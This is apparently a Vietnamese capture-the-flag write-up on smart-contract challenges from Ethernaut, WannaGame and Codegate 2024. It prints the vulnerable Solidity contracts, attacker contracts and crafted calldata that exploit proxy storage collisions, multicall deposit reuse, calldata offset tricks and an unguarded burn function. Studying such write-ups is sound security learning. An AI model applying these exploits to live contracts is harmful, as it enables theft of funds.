pragma experimental ABIEncoderV2;

import "github/OpenZeppelin/ethernaut/contracts/src/helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }

    receive() external payable { }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

Trong bài này, ta cần rút hết tiền của contract và trở thành admin.

Như challenge description đã gợi ý, mình tìm hiểu storage layout của proxy ra sao và tìm được link [này](https://medium.com/1milliondevs/solidity-storage-layout-for-proxy-contracts-and-diamonds-c4f009b6903). Mình để ý đến đoạn này: __"A proxy contract and its delegate/logic contracts or facets (all terms for the same thing) share the same storage layout!"__. Như vậy, ta sẽ hiểu là proxy contract và delegate contract chia sẻ chung storage layout. Do đó, 2 biến `pendingAdmin` của `PuzzleProxy` và `owner` của `PuzzleWallet` nằm cùng một slot, tương tự với `admin` và `maxBalance`.

Chính vì vậy, ta có thể trở thành owner của contract `PuzzleWallet` bằng cách gọi hàm `proposeNewAdmin` của contract `PuzzleProxy` với input là address của contract attack để có thể cấp quyền `whitelist`.

Khi đã trở thành owner, ta sẽ tìm cách trở thành admin trong contract `PuzzleProxy`. Như vậy, ta cần chỉnh sửa giá trị của `maxBalance`. Để ý rằng `maxBalance` có thể thay đổi thông qua hàm `setMaxBalance`, nên ta sẽ tìm cách gọi hàm này.

Ta cần vượt qua điều kiện `require(address(this).balance == 0, "Contract balance is not 0");`, tức là rút hết tiền của server contract. Khi check trên console của Ethernaut bằng web3js, ta có thể thấy được server contract đang có 0.001 eth. 

Ta sẽ chú ý đến hàm `execute`. Đây là hàm giúp ta có thể rút tiền của server contract nếu ta vượt qua điều kiện `require(balances[msg.sender] >= value, "Insufficient balance");`. Để có thể thay đổi giá trị của `balances[msg.sender]`, ta chú ý đến hàm `deposit()`. Nếu chỉ gọi hàm này, cả server contract và `balances[msg.sender]` đều sẽ nhận được ether, và vì thế ta sẽ không bao giờ thực hiện được hàm `execute()`. Chính vì vậy, ta sẽ hướng đến hàm `multicall`.

Trong hàm `multicall`, ta có thể call nhiều hàm cùng một lúc, và trong hàm cũng đã check việc gọi hàm `deposit`, khiến ta không thể gọi hai lần hàm deposit được. Nhưng hàm này không check việc gọi lại chính nó, và ta sẽ sử dụng lỗi này để exploit.

Do hàm `multicall` chỉ check xem hàm `deposit` có được gọi nhiều hơn 1 lần hay không với mỗi lần chạy, ta sẽ gọi hàm `multicall` trong chính nó, đồng thời khi gọi thì ta sẽ gọi tiếp hàm `deposit`.  Với cùng `msg.sender`, ta có thể tăng giá trị của `balances[msg.sender]` lên 0.002 eth, trong khi server contract chỉ tăng lên thêm 0.001 eth. Như vậy, `balances[msg.sender]` đã bằng với số eth có trong contract, và ta có thể rút hết tiền của contract `PuzzleWallet`.

Như đã đề cập việc chia sẻ storage layout ở trên, do `admin` và `maxBalance` cùng 1 slot nên khi đã rút hết tiền của `PuzzleWallet`, ta chỉ việc gọi hàm `setMaxBalance` với giá trị là address của ta là xong.

`solve.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/puzzle_wallet.sol";

contract Solve {
    PuzzleWallet IPuzzleWallet;
    PuzzleProxy IPuzzleProxy;
    function getInstance(address instanceAddress) public {
        IPuzzleWallet = PuzzleWallet(instanceAddress);
        IPuzzleProxy = PuzzleProxy(payable(instanceAddress));
    }

    bytes[] data_ = [abi.encodeWithSignature("deposit()")];
    bytes[] data = [abi.encodeWithSignature("deposit()"), abi.encodeWithSignature("multicall(bytes[])", data_)];
    function solve() public payable  {
        IPuzzleProxy.proposeNewAdmin(address(this));
        IPuzzleWallet.addToWhitelist(address(this));
        IPuzzleWallet.multicall{value: 0.001 ether}(data);
        IPuzzleWallet.execute(address(this), 0.002 ether, "");
        IPuzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));
    }

    receive() external payable { }

    fallback() external payable { }
}
```

Bài học:

- Sắp xếp layout của proxy và delegate/logic contract của nó thật cẩn thận.
- Kiểm soát state của biến khi sử dụng `delegatecall`.
- "Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, `msg.value` will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple `delegatecall`s to a function that looks safe on its own could lead to unwanted transfers of ETH, as `delegatecall`s keep the original `msg.value` sent to the contract."

### Motorbike

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

Trong bài này, ta cần destruct contract `Engine` bằng cách sử dụng `selfdestruct`.

Tuy nhiên, ta không thấy hàm `selfdestruct` trong contract `Engine`, nên ta sẽ đi tìm hàm có vẻ nguy hiểm, và ta chú ý đến hàm `upgradeToAndCall`.

Để gọi được hàm `upgradeToAndCall`, ta cần phải trở thành `upgrader` bằng cách gọi hàm `initialize()`. Nhưng để gọi hàm này được, ta cần phải vượt qua modifier `initializer`. 

Nếu như ta chỉ gọi hàm `initialize()` bình thường, ta sẽ bị lỗi do để truy cập được contract, ta phải đi qua proxy UUPS, và nó đã được initialize. Vì vậy, ta có thể nghĩ đến việc interact với contract `Engine` với address trong Proxy Storage, đó chính là address của `Engine` khi chưa đi qua UUPS. Bằng cách này, ta có thể gọi hàm `initialize()` và lấy quyền upgrade.

Khi đã có quyền upgrade, ta có thể sử dụng hàm `upgradeToAndCall` với address là address của một contract có chứa function `selfdestruct`. Bằng cách này, khi được gọi thông qua `delegatecall`, contract sẽ hiểu function `delegatecall` là của `Engine` contract và tự destruct nó.

Lí thuyết là vậy, tuy nhiên [từ bản Dencun fork, `selfdestruct` chỉ có thể xóa contract khi đã ở trong contract từ trước](https://github.com/OpenZeppelin/ethernaut/issues/701#issuecomment-1935760884), chứ không thể xóa thông qua hàm `delegatecall`, do đó ta không thể destruct contract `Engine` như yêu cầu đề bài được. Xem như mình biết thêm một cách attack :)

### Good Samaritan

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

Trong bài này, ta cần rút hết coin của contract `GoodSamaritan`.

Ta chú ý đến hàm `requestDonation`. Hàm này cho phép ta nhận 10 coin từ contract `GoodSamaritan` nếu như không có lỗi gì, hoặc nhận toàn bộ coin nếu như khi gặp lỗi `NotEnoughBalance()`. Ta sẽ đọc kĩ hơn cách mà method `.donate10()` bị lỗi.

Method `.donate10()` trong contract `Wallet` chuyển coin bằng method `.transfer()` của contract `Coin`. Đọc kĩ hàm `.transfer()`, ta thấy được nếu `msg.sender` là contract thì nó sẽ gọi hàm `notify()` trong interface `Inotifyable`.

Nhận thấy interface `Inotifyable` không có restrict là `pure` hoặc `view`, vì thế ta có thể chỉnh sửa hàm `notify()` trong này. Ta sẽ muốn hàm này trả về lỗi `NotEnoughBalance()` khi method `.donate10()` được gọi và hoạt động bình thường với method `transferRemainder()`. Do lỗi `NotEnoughBalance()` là custom error nên ta có thể cài đặt được trong contract attack của ta.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/goodSamaritan.sol";

error NotEnoughBalance();

contract Solve is INotifyable{
    GoodSamaritan IGoodSamaritan;
    bool check = true;
    function getInstance(address instanceAddress) public {
        IGoodSamaritan = GoodSamaritan(instanceAddress);
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        } else {}
    }

    function attack() public {
        IGoodSamaritan.requestDonation();
    }
}
```

### Gatekeeper Three

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```

Tương tự như hai bài Gatekeeper trước, ta cần vượt qua các modifier `gateOne`, `gateTwo`, `gateThree`.

Ta sẽ tìm cách vượt qua `gateTwo` trước. Modifier `gateTwo` yêu cầu `allowEntrance == true`, và điều này đạt được khi ta gọi hàm `getAllowance()` với password đúng. Để tìm được password, ta cần phải gọi hàm `createTrick()` để contract `SimpleTrick` gen password. Sau đó, ta có thể đọc giá trị của `password` trong contract `SimpleTrick` thông qua lệnh `web3.eth.getStorageAt()` với slot 2. Vậy là ta đã có password và vượt qua `gateTwo`.

Đối với `gateThree`, ta chia làm hai phần tương ứng với 2 điều kiện ta cần vượt qua là `address(this).balance > 0.001 ether` và `payable(owner).send(0.001 ether) == false)`. Với điều kiện đầu, do contract có hàm `receive()` nên ta chỉ cần chuyển tiền vào với hàm `sendTransaction` của web3js là được.

Đối với `gateOne` và điều kiện sau của `gateThree`, ta sẽ tạo contract attack với những điều kiện sau:

- `owner` chính là địa chỉ của attack contract
- `tx.origin` là địa chỉ của ta
- Khi chuyển tiền đến contract attack sẽ báo lỗi, vì thế sẽ trả về `false`

Như thế, contract attack của ta sẽ như sau:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/gatekeeper3.sol";

contract Solve {
    GatekeeperThree IGatekeeperThree;
    function getInstance(address instanceAddress) public {
        IGatekeeperThree = GatekeeperThree(payable(instanceAddress));
        IGatekeeperThree.construct0r();
    }

   function solve() public {
        IGatekeeperThree.enter();
   }

   receive() external payable {
        revert();
    }
}
```

Giờ thì deploy attack contract và interact nữa là xong.

### Switch

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```

Trong bài này, ta cần tìm cách để biến `switchOn` trở thành `true`. 

Ta cần phải gọi được hàm `turnSwitchOn()` để có thể chuyển trạng thái của `switchOn` trở thành `true`, tuy nhiên, modifier `onlyThis` yêu cầu chỉ có contract mới có thể vượt qua nên ta sẽ nghĩ cách gọi hàm `turnSwitchOn()` ở chỗ khác.

Ta chú ý đến hàm `flipSwitch()`, nếu gọi được hàm `turnSwitchOn()` bằng method `.call` ở trong này thì có thể vượt qua modifier `onlyThis`. Để gọi được hàm `flipSwitch()`, ta cần xem qua modifier `onlyOff`.

Với modifier `onlyOff`, ta cần vượt qua điều kiện `selector[0] == offSelector`. Ở đây, `selector` được tạo bằng cách copy 4 bytes từ byte thứ 68 (vị trí bắt đầu của `_data`), do đó, ta sẽ tìm cách làm cho 4 bytes từ byte thứ 68 của `_data` bằng với `bytes4(keccak256("turnSwitchOff()"))`, trong khi ta vẫn gọi được hàm `turnSwitchOn()`.

Trong đề bài đã hint về việc encode trong `CALLDATA`, và có thể đọc ở Solidity doc tại [đây](https://docs.soliditylang.org/en/v0.8.19/abi-spec.html#examples). Ta chú ý rằng kiểu dữ liệu `bytes` là dynamic types, do đó ta cần sử dụng offset ở dạng bytes để biết được data bắt đầu từ đâu. Do ta có thể điều kiển việc đọc data của solidity qua offset, nên ta sẽ nghĩ đến việc chỉnh sửa offset của nó. 

Với idea như vậy, `_data` của ta sẽ là `0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000`, trong đó:

- `30c13ade` : Method ID của hàm `flipSwitch()`, tức là `bytes4(keccak256("flipSwitch()"))`. Ta sẽ gọi hàm bằng cách này nếu gọi qua `.call`
- `0000000000000000000000000000000000000000000000000000000000000060`: Giá trị của offset. Ở đây, ta sẽ muốn đọc giá trị bắt đầu từ byte 96 (không tính Method ID).
- `0000000000000000000000000000000000000000000000000000000000000000`: Các byte thêm vào ngẫu nhiên. Do `selector` lấy 4 bytes từ byte thứ 68 (tính cả Method ID) trở đi, ta cần thêm 32 bytes để có thể điều khiển được `selector` sẽ lấy gì.
- `20606e1500000000000000000000000000000000000000000000000000000000`: MethodID của hàm `turnSwitchOff()`. Nếu đặt ở đây, `selector` sẽ nhận 4 bytes `20606e15` và do đó, ta có thể vượt qua điều kiện `selector[0] == offSelector`
- `0000000000000000000000000000000000000000000000000000000000000004`: Độ dài của `_data`
- `76227e1200000000000000000000000000000000000000000000000000000000`: MethodID của `turnSwitchOn()`. Như vậy, method `.call` sẽ gọi hàm `turnSwitchOn` và chuyển `switchOn = true`

```javascript
await sendTransaction({from: player, to: instance, data: "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})
```

Bài học: "Assuming positions in `CALLDATA` with dynamic types can be erroneous, especially when using hard-coded `CALLDATA` positions."

### HigherOrder

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

Trong bài này, ta cần trở thành `commander` bằng cách gọi thành công hàm `claimLeadership()`.

Để gọi được hàm `claimLeadership()`, ta cần phải làm cho biến `treasury` lớn hơn 255. Hàm duy nhất có thể chỉnh sửa biến `treasury` chính là `registerTreasury()`, tuy nhiên hàm này chỉ cho phép input nhỏ hơn 256 (`uint8`). Tuy nhiên, điều mà ta chú ý ở đây chính là hàm `calldataload(4)`.

Hàm `calldataload(4)` sẽ load 32 bytes từ byte thứ 4 trong data, nhưng ta cần làm rõ 'data' ở đây là gì, và mình tìm được câu trả lời ở [đây](https://www.reddit.com/r/ethereum/comments/dw1lgj/please_explain_what_data_is_in_calldataload/). Như vậy, ta có thể custom `msg.data` với việc gọi hàm `registerTreasury(uint8)` với input lớn hơn 255, bằng cách này, ta có thể gọi hàm `claimLeadership()` và hoàn thành challenge!

Bài này có thể giải trên console với web3js bằng command:
```javascript
await sendTransaction({from: player, to: instance, data: "0x211c85ab0000000000000000000000000000000000000000000000000000000000000100"})
```

với `211c85ab` là MethodID của `registerTreasury(uint8)` và `0000000000000000000000000000000000000000000000000000000000000100` là input của function.

## WannaGame Championship

### True Random

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

contract LuckyWheel {
    uint256 public closed;

    constructor() payable {}

    modifier onlyEOA() {
        require(!isContract(msg.sender), "LuckyWheel: ONLY_EOA");
        _;
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function wannaLuck(uint256 seed) external payable onlyEOA {
        require(msg.value == 0.1 ether, "LuckyWheel: INVALID_AMOUNT");
        uint256 random = uint256(keccak256(abi.encodePacked(seed, block.timestamp, msg.sender)));
        if (random % 100 == 0) {
            closed = 1;
        }
    }
}
```

Với bài này, ta cần làm cho biến `closed` trả về true là được. Để làm như vậy thì chỉ cần gọi hàm `wannaLuck` với `seed = 1` cho đến khi `random % 100 == 0`. 

![image](/images/blockchain-thingies/blockchain-thingies_3.png)

### Basic Vault

`setup.sol`
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./WannaETH.sol";
import "./PhantomToken.sol";
import "./Vault.sol";

contract Setup {
    WannaETH public immutable weth;
    PhantomToken public immutable pmt;

    Vault public immutable vault;

    constructor() {
        weth = new WannaETH();
        pmt = new PhantomToken();
        vault = new Vault(payable(address(weth)), payable(address(pmt)));

        weth.approve(address(vault), 1);
        pmt.approve(address(vault), 1);

        vault.deposit(address(weth), 1);
        vault.deposit(address(pmt), 1);
    }

    function isSolved() external view returns (bool) {
        return (vault.totalDeposited() > 1_000 * 10 ** 18);
    }
}
```

`vault.sol`
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./WannaETH.sol";
import "./PhantomToken.sol";

contract Vault {
    WannaETH public immutable weth;
    PhantomToken public immutable pmt;

    uint256 public totalDeposited;

    mapping(address => uint256) public deposited;

    constructor(address payable _weth, address payable _pmt) {
        weth = WannaETH(_weth);
        pmt = PhantomToken(_pmt);
    }

    function deposit(address asset, uint256 amount) external {
        require(amount > 0, "Vault: ZERO");
        require(IERC20(asset).balanceOf(msg.sender) >= amount, "Vault: INSUFFICIENT_WETH");

        deposited[msg.sender] += amount;
        totalDeposited += amount;

        bool success = IERC20(asset).transferFrom(msg.sender, address(this), amount);
        require(success, "Vault: TRANSFER_FAILED");
    }

    function withdraw(address asset, uint256 amount) external {
        require(amount > 0, "Vault: ZERO");
        require(deposited[msg.sender] >= amount, "Vault: INSUFFICIENT_DEPOSIT");

        deposited[msg.sender] -= amount;
        totalDeposited -= amount;

        bool success = IERC20(asset).transfer(msg.sender, amount);
        require(success, "Vault: TRANSFER_FAILED");
    }

    function claimFaucet() public {
        weth.transfer(msg.sender, 1);
        pmt.transfer(msg.sender, 1);
    }
}
```

Trong bài này, ta cần làm cho số lượng token của vault > `1000 * 1e18`

Chú ý rằng vault không check ta sử dụng token nào, vì vậy ta có thể generate một token ngẫu nhiên nào đó và mint cho bản thân một số lượng lớn, sau đó chỉ cần deposit vào vault là được

## Codegate 2024

### Staker

`setup.sol`
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Token} from "./Token.sol";
import {LpToken} from "./LpToken.sol";
import {StakingManager} from "./StakingManager.sol";

contract Setup {
    StakingManager public stakingManager;
    Token public token;

    constructor() payable {
        token = new Token();
        stakingManager = new StakingManager(address(token));

        token.transfer(address(stakingManager), 86400 * 1e18);

        token.approve(address(stakingManager), 100000 * 1e18);
        stakingManager.stake(100000 * 1e18);
    }

    function withdraw() external {
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function isSolved() public view returns (bool) {
        return token.balanceOf(address(this)) >= 10 * 1e18;
    }
}
```

`StakingManager.sol`
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {LpToken} from "./LpToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract StakingManager {
    uint256 constant REWARD_PER_SECOND = 1e18;

    IERC20 public immutable TOKEN;
    LpToken public immutable LPTOKEN;

    uint256 lastUpdateTimestamp;
    uint256 rewardPerToken;

    struct UserInfo {
        uint256 staked;
        uint256 debt;
    }

    mapping(address => UserInfo) public userInfo;

    constructor(address token) {
        TOKEN = IERC20(token);
        LPTOKEN = new LpToken();
    }

    function update() internal {
        if (lastUpdateTimestamp == 0) {
            lastUpdateTimestamp = block.timestamp;
            return;
        }

        uint256 totalStaked = LPTOKEN.totalSupply();
        if (totalStaked > 0 && lastUpdateTimestamp != block.timestamp) {
            rewardPerToken = (block.timestamp - lastUpdateTimestamp) * REWARD_PER_SECOND * 1e18 / totalStaked;
            lastUpdateTimestamp = block.timestamp;
        }
    }

    function stake(uint256 amount) external {
        update();

        UserInfo storage user = userInfo[msg.sender];

        user.staked += amount;
        user.debt += (amount * rewardPerToken) / 1e18;

        LPTOKEN.mint(msg.sender, amount);
        TOKEN.transferFrom(msg.sender, address(this), amount);
    }

    function unstakeAll() external {
        update();

        UserInfo storage user = userInfo[msg.sender];

        uint256 staked = user.staked;
        uint256 reward = (staked * rewardPerToken / 1e18) - user.debt;
        user.staked = 0;
        user.debt = 0;

        LPTOKEN.burnFrom(msg.sender, LPTOKEN.balanceOf(msg.sender));
        TOKEN.transfer(msg.sender, staked + reward);
    }
}
```

`LpToken.sol`
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract LpToken is ERC20 {
    address immutable minter;

    constructor() ERC20("LP Token", "LP") {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "only minter");
        _mint(to, amount);
    }

    function burnFrom(address from, uint256 amount) external {
        _burn(from, amount);
    }
}
```

Trong bài này, ta cần làm cho lượng token trong contract Setup > `10 * 1e18`, với việc bắt đầu từ `1e18` token (nhận được thông qua hàm `withdraw()`)

Đọc qua contract `StakingManager`, ta thấy rằng sau một khoảng thời gian, số tiền mà ta gửi vào sẽ tăng lên do `rewardPerToken`. Tuy nhiên, nếu chỉ gửi tiền và đợi thì số lượng token không thể tăng lên tới `10 * 1e18` token được (server có timeout 30'). Do đó, ta cần tìm cách khác.

Khi đọc cách tính hàm `rewardPerToken`, ta thấy việc tính toán dựa vào `block.timestamp` và `totalSupply` của `LpToken`. Do việc kiểm soát `block.timestamp` là không thể nên ta sẽ thử tìm cách điều khiển `totalSupply`.

Trong contract `LpToken.sol`, ta chú ý có 2 hàm là `burnFrom` và `mint`. Trong khi hàm `mint` yêu cầu chỉ có `minter` mới thực hiện được thì hàm `burnFrom` lại không cần điều kiện gì. Đây chính là vulnerable mà ta có thể khai thác.

Nếu đọc kĩ `Setup.sol`, ta thấy rằng contract đã gọi hàm `stake` với giá trị `100000 * 1e18`, do đó, lượng `LpToken` của contract là `100000 * 1e18`, từ đó, ta có thể gọi hàm `burnFrom` với address của contract `setup` và số lượng `LpToken` thật lớn, từ đó `totalSupply` của `LpToken` sẽ giảm mạnh, dẫn đến việc giá trị của `rewardPerToken` tăng lên rất cao. 

Chiến thuật:

- Stake toàn bộ token ta có sau khi nhận từ contract `Setup` qua hàm `withdraw`
- Gọi hàm `burnFrom` với address của contract `Setup` và giá trị `value` thật lớn, nhưng không làm cho giá trị của `totalSupply` trở về 0
- Khi đó, nếu như tính toán lại giá trị của `rewardPerToken` trong hàm `update()` thì giá trị của nó sẽ tăng lên rất nhiều. Từ đó ta chỉ cần gọi hàm `stakeAll` để lấy hết tiền là được.

